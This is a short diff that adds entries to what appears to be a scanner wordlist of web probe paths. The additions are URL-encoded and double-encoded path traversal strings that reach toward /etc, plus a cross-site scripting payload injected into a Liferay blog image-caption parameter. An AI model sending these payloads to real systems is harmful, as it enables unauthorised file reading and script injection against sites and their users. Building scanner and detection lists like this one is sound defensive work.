@@ -2094,3 +2094,9 @@
 /Modules.php?modname=Users/Preferences.php&tab=
 /.env/.
 //.env
+/application/default
+/application/..%2F..%2F..%2F..%2F..%2Fetc
+/application/..%2F..%2F..%2F..%2F..%2Fetc/main
+/application/..%252F..%252F..%252F..%252F..%252Fetc
+/application/default%2C..%2F..%2F..%2F..%2F..%2Fetc
+/o/blogs-web/blogs/entry_cover_image_caption.jsp?coverImageURL=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
